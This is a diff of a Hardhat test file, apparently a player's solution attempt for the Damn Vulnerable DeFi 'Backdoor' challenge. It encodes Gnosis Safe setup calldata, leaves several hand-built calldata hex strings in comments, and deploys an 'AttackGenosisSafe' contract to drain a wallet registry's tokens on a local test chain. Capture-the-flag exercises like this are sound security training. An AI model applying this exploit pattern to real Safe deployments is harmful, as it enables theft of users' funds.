@@ -2,99 +2,142 @@ const {ethers} = require('hardhat');
 const {expect} = require('chai');
 
 describe('[Challenge] Backdoor', function () {
-    let deployer, users, alice, bob, charlie, david, attacker;
+    let deployer, users, player;
+    let masterCopy, walletFactory, token, walletRegistry;
 
-    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');
+    const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;
+    const ONE_FOURTH_AMOUNT_TOKENS_DISTRIBUTED = 10n * 10n ** 18n;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
+        [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
         users = [alice.address, bob.address, charlie.address, david.address]
 
         // Deploy Gnosis Safe master copy and factory contracts
-        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
-        // this.gnosisSafeProxy = await (await ethers.getContractFactory('GnosisSafeProxy', deployer)).deploy();
-        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
-        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+        masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
+        walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
+        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
 
-
-        await this.masterCopy.deployed();
-        // await this.gnosisSafeProxy.deployed();
-        await this.walletFactory.deployed();
-        await this.token.deployed();
-        // console.log("masterCopy", this.masterCopy.address);
-        // console.log("walletFactory", this.walletFactory.address);
-        // console.log("token", this.token.address);
         // Deploy the registry
-        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
-            this.masterCopy.address,
-            this.walletFactory.address,
-            this.token.address,
+        walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
+            masterCopy.address,
+            walletFactory.address,
+            token.address,
             users
         );
-        // console.log(await this.walletRegistry.test())
-        // console.log("walletRegistry", this.walletRegistry.address);
-        // https://www.youtube.com/watch?v=GHyxe32Z814
-        // Users are registered as beneficiaries
+        expect(await walletRegistry.owner()).to.eq(deployer.address);
+
         for (let i = 0; i < users.length; i++) {
+            // Users are registered as beneficiaries
             expect(
-                await this.walletRegistry.beneficiaries(users[i])
+                await walletRegistry.beneficiaries(users[i])
             ).to.be.true;
+
+            // User cannot add beneficiaries
+            await expect(
+                walletRegistry.connect(
+                    await ethers.getSigner(users[i])
+                ).addBeneficiary(users[i])
+            ).to.be.reverted;
         }
 
-        // Transfer tokens to be distributed to the registry
-        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
+        console.log("walletRegistry :" + walletRegistry.address)
+        console.log("masterCopy :" + masterCopy.address)
+        console.log("walletFactory :" + walletFactory.address)
+        console.log("alice :" + alice.address)
+        console.log("bob :" + bob.address)
+        console.log("charlie :" + charlie.address)
+        console.log("david :" + david.address)
+        console.log("player :" + player.address)
+        console.log("player :" + player.address)
+        console.log("token :" + token.address)
 
+        // Transfer tokens to be distributed to the registry
+        await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
     });
 
-    it.only('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+    it('Execution', async function () {
+        // const tnx = await walletFactory.createProxyWithCallback(masterCopy.address, "0xb63e800d00000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb200000000000000000000000000000000000000000000000000000000000001a0000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000009fe46736679d2d9a65f0992f2272de9f3c7fa6e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009965507d1a55bcc2695c58ba16fb37d819b0a4dc000000000000000000000000000000000000000000000000000000000000000400000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc00000000000000000000000090f79bf6eb2c4f870365e785982e1f101e93b90600000000000000000000000015d34aaf54267db7d7c367839aaf71a00a2c6a6500000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000" , 0, walletRegistry.address);
         const ABI = [
-            "function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver) external"
+            // "function transfer(address to, uint amount)"
+            // "function transferFrom(address sender,address recipient,uint amount)"
+            "function approve(address spender,uint amount)",
+            "function setup(address[] _owners,uint256 _threshold,address to,bytes calldata data,address fallbackHandler, address paymentToken,uint256 payment,address payable paymentReceiver)"
+
+
         ];
+        const iface = new ethers.utils.Interface(ABI);
+        // const byteArr = iface.encodeFunctionData("setup", [[player.address], 1, player.address, 0x00, player.address, token.address, 10, player.address])
+        // const byteArr = iface.encodeFunctionData("setup", [[player.address], 1, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), 0x00, player.address, token.address, 10, player.address])
+        const byteArr = iface.encodeFunctionData("setup", [[alice.address], 1, player.address, 0x00, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), token.address, 0, player.address])
+        // const byteArr = iface.encodeFunctionData("setup", [[alice.address, bob.address,charlie.address, david.address], 4, player.address, 0x00, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), token.address, 0, player.address])
 
-        const selector = new ethers.utils.Interface(ABI)
-        let functionFragment = "setup";
-        functionFragment = selector.getFunction(functionFragment);
+        // console.log(byteArr);
+        // console.log("0xb63e800d000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000009965507d1a55bcc2695c58ba16fb37d819b0a4dc000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009fe46736679d2d9a65f0992f2272de9f3c7fa6e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009965507d1a55bcc2695c58ba16fb37d819b0a4dc000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c800000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000");
 
-        // const attackContract = await  (await ethers.getContractFactory('AttackGenosisSafe', attacker)).deploy();
-        // await attackContract.deployed();
-        // console.log(await attackContract.attack())
-
-        // console.log(selector.getSighash(functionFragment));
-        let val = "0xb63e800d";
-        // while (true) {
-        //     val += "01";
-        //     try{
-        //         const tnx = await this.walletFactory.connect(alice).createProxyWithCallback(this.masterCopy.address, "0xb63e800d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" , 0, this.walletRegistry.address, {gasLimit: 30_000000});
-        //         console.log(val);
-        //         break;
-        //     }
-        //     catch (e){}
+        // const tnx = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, "0xb63e800d000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000009965507d1a55bcc2695c58ba16fb37d819b0a4dc000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009fe46736679d2d9a65f0992f2272de9f3c7fa6e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009965507d1a55bcc2695c58ba16fb37d819b0a4dc000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c800000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000" , 0, walletRegistry.address);
+        // await tnx.wait();
         //
-        // }
-        const tnx = await this.walletFactory.connect(alice).createProxyWithCallback(this.masterCopy.address, "0xb63e800d00000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000000000000000000000000000000000000000000160000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb2000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc400000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000" , 0, this.walletRegistry.address, {gasLimit: 30_000000});
-        const data = await tnx.wait();
-        // console.log(data);
+        // const byteArr1 = iface.encodeFunctionData("setup", [[alice.address], 1, player.address, 0x00, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), token.address, AMOUNT_TOKENS_DISTRIBUTED, player.address])
+        // const tnx1 = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, byteArr1 , 0, walletRegistry.address);
+        // await tnx1.wait();
+
+        // const byteArr2 = iface.encodeFunctionData("setup", [[bob.address], 1, player.address, 0x00, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), token.address, AMOUNT_TOKENS_DISTRIBUTED, player.address])
+        // const tnx2 = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, byteArr2 , 0, walletRegistry.address);
+        // await tnx2.wait();
+        //
+        // const byteArr3 = iface.encodeFunctionData("setup", [[charlie.address], 1, player.address, 0x00, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), token.address, AMOUNT_TOKENS_DISTRIBUTED, player.address])
+        // const tnx3 = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, byteArr3 , 0, walletRegistry.address);
+        // await tnx3.wait();
+        //
+        const byteArr1 = iface.encodeFunctionData("setup",
+            [
+                [david.address],
+                1,
+                player.address,
+                0x00,
+                ethers.utils.getAddress("0x0000000000000000000000000000000000000000"),
+                ethers.utils.getAddress("0x0000000000000000000000000000000000000000"),
+                0, player.address
+            ])
+        // console.log("byteArr1 : " + byteArr1);
+             const attackContract = await (await ethers.getContractFactory('AttackGenosisSafe', deployer)).deploy(walletFactory.address, masterCopy.address, walletRegistry.address);
+        console.log("attackContract address : " + attackContract.address)
+
+        // const tnx4 = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, byteArr1, 0, walletRegistry.address);
+        const tnx4 = await attackContract.connect(player).attack(alice.address,bob.address,charlie.address, david.address, token.address);
+        await tnx4.wait();
+
+
+        /** CODE YOUR SOLUTION HERE */
     });
 
     after(async function () {
-        /** SUCCESS CONDITIONS */
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+        // Player must have used a single transaction
+        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+
         for (let i = 0; i < users.length; i++) {
-            let wallet = await this.walletRegistry.wallets(users[i]);
+            let wallet = await walletRegistry.wallets(users[i]);
 
             // User must have registered a wallet
-            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");
+            // console.log("wallet : " + wallet)
+            // console.log("beneficiaries : " + users[i])
+            expect(wallet).to.not.eq(
+                ethers.constants.AddressZero,
+                'User did not register a wallet'
+            );
 
             // User is no longer registered as a beneficiary
             expect(
-                await this.walletRegistry.beneficiaries(users[i])
+                await walletRegistry.beneficiaries(users[i])
             ).to.be.false;
         }
 
-        // Attacker must have taken all tokens
+        // Player must own all tokens
         expect(
-            await this.token.balanceOf(attacker.address)
+            await token.balanceOf(player.address)
         ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
     });
 });
